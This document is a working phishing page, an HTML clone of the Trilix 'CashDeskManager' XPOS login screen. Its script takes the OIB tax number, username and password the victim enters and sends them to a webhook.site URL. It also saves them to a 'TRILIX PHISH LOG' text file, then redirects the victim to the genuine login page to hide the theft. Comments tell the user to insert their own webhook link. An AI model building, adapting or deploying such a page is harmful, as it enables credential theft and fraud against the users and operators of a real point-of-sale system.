<!DOCTYPE html>
<html lang="hr">
<head>
    <meta charset="UTF-8">
    <title>CashDeskManager - Login</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://dsds.trilix.hr/CashDeskManager/resources/themes/xpos/favicon.ico">

    <!-- Ugrađeni Bootstrap CSS (kopiran sa CDN-a) -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Ugrađeni XPOS tema CSS (kopiran sa originalnog sajta) -->
    <style>
        /* Ugrađeni stilovi iz /CashDeskManager/resources/themes/xpos/style-xpos.css */
        body {
            background-color: #dcdcdc;
            font-family: Arial, sans-serif;
            color: #333;
        }
        .container#loginFormContainer {
            max-width: 400px;
            margin: 80px auto;
            padding: 30px;
            background-color: #e6e6e6;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
        }
        #loginImg {
            display: block;
            margin: 0 auto 20px auto;
        }
        .form-horizontal .form-group {
            margin-bottom: 15px;
        }
        .form-horizontal .control-label {
            text-align: left;
            font-weight: normal;
        }
        .btn-primary {
            background-color: #b30000;
            border-color: #b30000;
            color: white;
            font-weight: bold;
        }
        .btn-primary:hover, .btn-primary:focus {
            background-color: #800000;
            border-color: #800000;
        }
        .row {
            margin-top: 20px;
            font-size: small;
            color: rgb(117, 117, 117);
        }
        /* Sklanjanje inline DarkReader stilova ako postoje */
        [data-darkreader-inline-color] { color: inherit !important; }
    </style>
</head>
<body>

<div class="container" id="loginFormContainer">
    <img src="https://dsds.trilix.hr/CashDeskManager/resources/themes/xpos/xpos-logo.png" id="loginImg" alt="XPOS Logo">

    <form name="f" class="form-horizontal form-horizontal--full" id="phishForm">
        <input type="hidden" name="_csrf" value="edbc40c5-3ae2-4040-b068-8e700ad0d79c">

        <div class="form-group">
            <label class="control-label col-sm-3" for="oib">OIB:</label>
            <div class="col-sm-9">
                <input type="text" class="form-control" id="oib" name="oib" autofocus="autofocus">
            </div>
        </div>

        <div class="form-group">
            <label class="control-label col-sm-3" for="username">Korisničko ime:</label>
            <div class="col-sm-9">
                <input type="text" class="form-control" id="username" name="username">
            </div>
        </div>

        <div class="form-group">
            <label class="control-label col-sm-3" for="password">Zaporka:</label>
            <div class="col-sm-9">
                <input type="password" class="form-control" id="password" name="password">
            </div>
        </div>

        <div class="form-group">
            <div class="col-sm-offset-3 col-sm-9">
                <div class="checkbox">
                    <label><input type="checkbox" id="remember-me" name="remember-me"> Zapamti me</label>
                </div>
            </div>
        </div>

        <div class="form-group">
            <div class="col-sm-offset-3 col-sm-9">
                <button type="button" class="btn btn-primary" id="loginBtn">Login</button>
            </div>
        </div>

        <div class="row" style="margin-bottom: 0">
            <div class="col-sm-6" align="left">
                <span>3.8.0 (b4183b1)</span>
            </div>
            <div class="col-sm-6" align="right">
                <span>powered by Trilix</span>
            </div>
        </div>
    </form>
</div>

<script>
    // OVAJ DEO JE BITAN - ZAMENI "TVOJ_WEBHOOK_LINK" SA STVARNO LINKOM
    const WEBHOOK_URL = 'https://webhook.site/b5e28484-5c0d-4318-a432-af4f5f6380f6';

    function sendCreds() {
        const oib = document.getElementById('oib').value;
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // 1. Pošalji na webhook
        try {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({oib, username, password})
            });
        } catch(e) {}

        // 2. Spusti fajl na lokalni disk
        const logContent = `=== TRILIX PHISH LOG ===\nDate: ${new Date().toISOString()}\nOIB: ${oib}\nUser: ${username}\nPass: ${password}`;
        const blob = new Blob([logContent], {type: "text/plain"});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = "trilix_creds.txt";
        a.click();
        URL.revokeObjectURL(url);

        // 3. Redirect na pravi sajt
        window.location.href = 'https://dsds.trilix.hr/CashDeskManager/login';
    }

    document.getElementById('loginBtn').addEventListener('click', sendCreds);
</script>

</body>
</html>
